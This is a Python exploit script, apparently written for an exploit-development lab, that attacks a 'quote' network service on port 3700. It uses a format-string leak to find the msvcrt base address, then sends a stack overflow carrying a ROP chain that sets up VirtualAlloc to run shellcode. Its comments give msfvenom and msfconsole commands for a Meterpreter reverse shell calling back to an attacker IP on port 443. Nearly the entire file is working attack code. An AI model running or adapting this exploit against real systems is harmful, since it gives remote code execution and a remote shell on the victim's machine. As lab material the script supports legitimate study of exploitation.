import socket
import sys
from struct import pack


def overflowEIP(server,port,baseDll):

    buf = bytearray([0x41]*4) # opcode triggers overflow

    #  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.12 LPORT=443 -b "\x00" -f py -v shellcode --smallest
    #  msfconsole -q -x "use multi/handler;  set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.132.12; set LPORT 443; exploit"
    #shellcode =  b"\x90\x90\x81\xC4\x24\xFA\xFF\xFF" # add esp,-1500 // give some space to avoid metastploit shellcode decoder to corrupt itelf.
    shellcode = b"\x90\x90\x81\xC4\x3C\xF6\xFF\xFF"
    shellcode += b"SHELLCODE HERE"

    nops = b"\x90" * 100
    
    shellcode =  nops + shellcode + b"C" * (800 - len(shellcode) - len(nops) ) 

    # VirtualAlloc Template
    va = pack("<L",(0x48484848)) # VirtualAlloc
    va += pack("<L",(0x49494949))      # shellcode address
    va += pack("<L",(0x50505050))      # lpAddress -> Shellcode Address
    va += pack("<L",(0x51515151))      # dwSize -> 0x1
    va += pack("<L",(0x52525252))      # flAllocationType -> 0x1000
    va += pack("<L",(0x53535353))      # flProtect -> 0x40

    padding = b"A" * 0x10

    buf += b"B" * (2060 - len(shellcode) - len(va) - len(padding)) + shellcode + padding + va
    buf += pack("<L",(baseDll+0x45b10)) # EIP (we control) 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret ; (1 found)

    # ROP CHAIN
    # Patching Shellcode Address
    rop = pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(baseDll+0x0c14d)) # 0x1010c14d: pop ecx ; ret
    rop += pack("<L",(0xfffffcc0)) # -0x340
    rop += pack("<L",(baseDll+0x395b0)) # 0x101395b0: add ecx, esi ; add eax, ecx ; pop esi ; pop ebp ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # Junk for esi
    rop += pack("<L",(0x42424242)) # Junk for ebp
    rop += pack("<L",(baseDll+0x45b10)) # 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret
    rop += pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xffffffcc)) # -0x34
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp

    # Patching lpAddress -> Shellcode
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xffffffd0)) # -0x30
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp

    # Patching dwSize -> 0x1
    rop += pack("<L",(baseDll+0x0c14d)) # 0x1010c14d: pop ecx ; ret
    rop += pack("<L",(0xffffffff)) # -0x1
    rop += pack("<L",(baseDll+0x10778))  # 0x10110778: inc ecx ; ret ; (1 found)
    rop += pack("<L",(baseDll+0x10778))  # 0x10110778: inc ecx ; ret ; (1 found)
    rop += pack("<L",(baseDll+0x45b10)) # 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret
    rop += pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xffffff84)) # -0x7c
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp

    # Patching flAllocationType -> 0x1000
    rop += pack("<L",(baseDll+0x0c14d)) # 0x1010c14d: pop ecx ; ret
    rop += pack("<L",(0x88889888)) # ? 0x88888888 + 0x1000
    rop += pack("<L",(baseDll+0x932e4)) # 0x101932e4: pop edx ; ret ; (1 found)
    rop += pack("<L",(0x88888888)) # ? 0x88888888
    rop += pack("<L",(baseDll+0x57990)) # 0x10157990: sub ecx, edx ; sbb eax, edx ; mov edx, eax ; mov eax, ecx ; pop ebp ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # Junk for ebp
    rop += pack("<L",(baseDll+0x45b10)) # 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret
    rop += pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xffffff4c)) # -0xb4
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp

    # Patching flProtect -> 0x40
    rop += pack("<L",(baseDll+0x0c14d)) # 0x1010c14d: pop ecx ; ret
    rop += pack("<L",(0x888888c8)) # ? 0x88888888 + 0x40
    rop += pack("<L",(baseDll+0x932e4)) # 0x101932e4: pop edx ; ret ; (1 found)
    rop += pack("<L",(0x88888888)) # ? 0x88888888
    rop += pack("<L",(baseDll+0x57990)) # 0x10157990: sub ecx, edx ; sbb eax, edx ; mov edx, eax ; mov eax, ecx ; pop ebp ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # Junk for ebp
    rop += pack("<L",(baseDll+0x45b10)) # 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret
    rop += pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xffffff14)) # -0xec
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp


    # Patching VirtualAlloc
    rop += pack("<L",(baseDll+0x3aa22)) # 0x1013aa22: pop eax ; ret ; (1 found)
    rop += pack("<L",(baseDll+0xb81b8)) # IAT VirtualAlloc
    rop += pack("<L",(baseDll+0x73eac)) # 0x10173eac: mov eax,  [eax] ; pop esi ; pop ebp ; ret
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(baseDll+0x47d5d)) # 0x10147d5d: mov ecx, eax ; mov eax, esi ; pop esi ; retn 0x0010 
    rop += pack("<L",(0x42424242)) # Junk for esi
    rop += pack("<L",(baseDll+0x45b10)) # 0x10145b10: push esp ; sbb  [ebx], 0x5FC03310 ; pop esi ; pop ebx ; ret
    rop += pack("<L",(0x42424242)) # Junk for ebx
    rop += pack("<L",(0x42424242)) # Junk for retn 0x0010
    rop += pack("<L",(0x42424242)) # Junk for retn 0x0010
    rop += pack("<L",(0x42424242)) # Junk for retn 0x0010
    rop += pack("<L",(0x42424242)) # Junk for retn 0x0010
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xfffffeb0)) # -0x150
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0xa2978)) # 0x101a2978: mov  [eax], ecx ; pop eax ; pop ebp ; ret 
    rop += pack("<L",(0x42424242)) # Junk for eax
    rop += pack("<L",(0x42424242)) # Junk for ebp

    # Align ESP 
    rop += pack("<L",(baseDll+0x3c69b)) # 0x1013c69b: pop ebx ; ret ; (1 found)
    rop += pack("<L",(0xfffffeb0)) # -0x150
    rop += pack("<L",(baseDll+0x98133)) # 0x10198133: add ebx, esi ; stc ; ret ;
    rop += pack("<L",(baseDll+0x17926)) # 0x10117926: xchg eax, ebx ; ret
    rop += pack("<L",(baseDll+0x0fad5)) # 0x1010fad5: xchg eax, esp ; ret
  
    
    buf += rop + b"D" * (0x4000 - len(buf) - len(rop)) # Padding

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    resp = s.recv(1024)
    print("Response: ",resp)

    print("[+] Packet Crash Sent")


def leakBaseDll(server,port,quote_index):
    buf = pack("<L",(0x385)) # opcode -> get_quote
    buf += pack("<L",(quote_index)) # Data Index argument for get_quote
    buf += b"A" * (0x200 - len(buf))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    resp = s.recv(1024)
    print("[+] Packet Sent")
    return resp


def add_quote(server,port):
    buf = pack("<L",(0x386)) # opcode -> add_quote
    buf += b"%x" * (0x200 - len(buf))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    resp = s.recv(1024)
    print("[+] Packet Sent")
    print("Response: ",resp)
    return resp


def main():

    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 3700

    # Add Quotes and Receive Index Quotes
    quote_index = add_quote(server,port)

    # Flipping bytes to little endian
    quote_index_inverted_bytes = quote_index[3] << 24
    quote_index_inverted_bytes += quote_index[2] << 16
    quote_index_inverted_bytes += quote_index[1] << 8
    quote_index_inverted_bytes += quote_index[0] 

    # Leaked BaseDll -> Get Quotes
    leakedmsvcrtBaseAddr = leakBaseDll(server,port,int(quote_index_inverted_bytes))

    # Extracting the leadked Addresss
    msvcrtBaseAddr = leakedmsvcrtBaseAddr[:8]
    # Get Base Base Address
    msvcrtBaseAddr = int(msvcrtBaseAddr.decode(),16) - 0x66bc0

    print("Leaked module msvcrt: ",hex(msvcrtBaseAddr))

    # Crashing and Control EIP
    overflowEIP(server,port,msvcrtBaseAddr)

    sys.exit(0)

if __name__ == '__main__':
    main()
